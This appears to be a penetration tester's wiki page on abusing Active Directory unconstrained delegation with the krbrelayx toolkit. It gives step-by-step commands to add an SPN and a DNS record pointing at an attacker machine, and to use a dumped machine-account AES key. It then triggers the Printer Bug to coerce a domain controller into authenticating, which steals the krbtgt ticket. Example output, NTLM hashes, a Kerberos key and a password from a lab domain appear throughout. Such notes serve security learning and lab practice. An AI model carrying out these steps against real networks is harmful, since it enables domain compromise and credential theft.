# [krbrelayx](https://github.com/dirkjanm/krbrelayx)

> Toolkit for abusing [[unconstrained-delegation|unconstrained delegation]].

---

## Add a new `Host` SPN to a compromised unconstrained delegation computer or user account

```bash
$ cd krbrelayx
$ python3 addspn.py -u $DOMAIN\\$USERNAME -p $PASSWORD_OR_HASH -s host/$NEW_ATTACKER_FQDN $DOMAIN_CONTROLLER_FQDN_OR_IP --additional
```

- `$DOMAIN`: fully qualified (i.e. `marvel.test`)
- `$USERNAME`: the SAM account name of the user/computer account configured with unconstrained delegation (i.e., `HYDRA-WS02\$`)
- `$PASSWORD_OR_HASH`: either the password or the `LM:NTLM` hash of the user/computer account configured with unconstrained delegation
- `$NEW_ATTACKER_FQDN`: the new FQDN that will end up pointing to the attacker-controlled machine
- `--additional` adds a new SPN, whereas omitting it attempts to modify an existing SPN

**Note**: I have been unsuccessful at adding SPNs to user accounts in the past. Adding SPNs to computer accounts has been successful, though. Not being able to add an nonexistent `HOST` SPN to the user account somewhat nerfs this attack.

Example:

```bash
$ python3 addspn.py -u marvel.test\\HYDRA-WS02\$ -p aad3b435b51404eeaad3b435b51404ee:7d262be314027bed4dad3baed0142d21 -s host/tgihf.marvel.test 10.10.10.110
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
```

---

## Add a new DNS record to ADIDNS that maps the new `Host` SPN in the unconstrained delegation user/comuter account to an attacker-controlled IP address

```bash
$ cd krbrelayx
$ python3 dnstool.py -u $DOMAIN\\$USERNAME -p $PASSWORD_OR_HASH -r $NEW_ATTACKER_FQDN --action {add,modify,delete} --data $ATTACKER_CONTROLLED_IP_ADDRESS $DOMAIN_CONTROLLER_FQDN_OR_IP
```

- `$DOMAIN`: fully qualified (i.e. `marvel.test`)
- `$USERNAME`: the SAM account name of some domain user
- `$PASSWORD_OR_HASH`: either the password or the `LM:NTLM` hash `$USERNAME`
- `$NEW_ATTACKER_FQDN`: the new FQDN that will end up pointing to the attacker-controlled machine

Example:

```bash
$ cd krbrelayx
$ python3 dnstool.py -u marvel.test\\HYDRA-WS02\$ -p aad3b435b51404eeaad3b435b51404ee:7d262be314027bed4dad3baed0142d21 -r tgihf2.marvel.test --action add --data 192.168.1.200 10.10.10.110
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
/opt/krbrelayx/dnstool.py:241: DeprecationWarning: please use dns.resolver.Resolver.resolve() instead
  res = dnsresolver.query(zone, 'SOA')
[-] Adding new record
[+] LDAP operation completed successfully
```

---

## Coerce the domain controller into authenticating to the attacker controlled machine as if it was the unconstrained delegation computer and steal `krbtgt`'s TGT

Start `krbrelayx.py` with one of the following options:

1. The AES256 Kerberos key of the unconstrained delegation computer account (found in LSA secrets) --> this is the preferred method

```bash
$ cd krbrelayx
$ sudo python3 krbrelayx.py -aesKey $AESKEY [-debug]
```

Example:

```bash
$ sudo python3 krbrelayx.py -aesKey a3b8943b6cfbc936ce80c4e159e3f5531c718ab5e0da9741ff05dd4882f152b9 -debug
```

The AES key was found in the following line from dumping LSA secrets:

```bash
...
[*] $MACHINE.ACC 
MARVEL\HYDRA-WS02$:aes256-cts-hmac-sha1-96:a3b8943b6cfbc936ce80c4e159e3f5531c718ab5e0da9741ff05dd4882f152b9
...
```

2. The unconstrained delegation computer account's **password** and the **salt** used to generate its Kerberos key
	- The **password** is simply the password
	- The **salt** is the all-caps domain name concatenated with the case-sensitive unconstrained delegation computer account name
		- For example: if the domain name is `marvel.test` and the computer account name is `HYDRA-WS02\$`, the **salt** would be `MARVEL.TESTHYDRA-WS02\$`.

```bash
$ cd krbrelayx
$ sudo python3 krbrelayx.py --krbpass $PASSWORD --krbsalt $SALT [-debug]
```

With `krbrelayx.py` listening, trigger the "Printer Bug" to coerce the domain controller into authenticating to the attacker controlled machine.

```bash
$ cd krbrelayx
$ python3 printerbug.py $DOMAIN/$USERNAME[:$PASSWORD]@$DOMAIN_CONTROLLER_FQDN_OR_IP [-hashes $HASHES] $NEW_ATTACKER_FQDN
```

- `$USERNAME` can be any domain user
- You'll need either `$PASSWORD` or `-hashes $HASHES` for which ever domain user you're using
	- `$HASHES` is `LMHASH:NTHASH`
- `$NEW_ATTACKER_FQDN` is the FQDN that points to the attacker-controlled host and is a `Host` SPN on the unconstrained delegation computer account

Example:

```bash
$ python3 printerbug.py marvel.test/fcastle:'P@$$w0rd1'@10.10.10.110 tgihf2.marvel.test
[*] Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Attempting to trigger authentication via rprn RPC at hydra-dc.marvel.test
[*] Bind OK
[*] Got handle
DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Triggered RPC backconnect, this may or may not have worked
```

`krbrelayx.py`'s successful output:

```bash
$ sudo python3 krbrelayx.py -aesKey a3b8943b6cfbc936ce80c4e159e3f5531c718ab5e0da9741ff05dd4882f152b9 -debug
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client SMB loaded..
[*] Running in export mode (all tickets will be saved to disk)
[*] Setting up SMB Server
[*] Setting up HTTP Server

[*] Servers started, waiting for connections
[*] SMBD: Received connection from 10.10.10.110
[+] Ticket decrypt OK
[*] Got ticket for HYDRA-DC$@MARVEL.TEST [krbtgt@MARVEL.TEST]
[*] Saving ticket in HYDRA-DC$@MARVEL.TEST_krbtgt@MARVEL.TEST.ccache
[*] SMBD: Received connection from 10.10.10.110
[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
[*] SMBD: Received connection from 10.10.10.110
[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
```

`krbtgt`'s TGT will be saved in the file `./$DC_HOSTNAME\$@DOMAIN_krbtgt@$DOMAIN.ccache` (in the above example, `HYDRA-DC$@MARVEL.TEST_krbtgt@MARVEL.TEST.ccache`).

[[using-kerberos-tickets|Import the ticket into impacket and go to town]] ([[dumping-hashes]], perhaps?).

---

## Coerce any domain computer to authenticate to a particular FQDN (requires domain user credentials)

```bash
$ cd krbrelayx
$ python3 printerbug.py $DOMAIN/$USERNAME[:$PASSWORD]@$TARGET_COMPUTER_FQDN_OR_IP [-hashes $HASHES] $FQDN
```

- `$USERNAME` can be any domain user
- You'll need either `$PASSWORD` or `-hashes $HASHES` for which ever domain user you're using
	- `$HASHES` is `LMHASH:NTHASH`
- `$FQDN` is the FQDN that you'd like the target computer to authenticate to
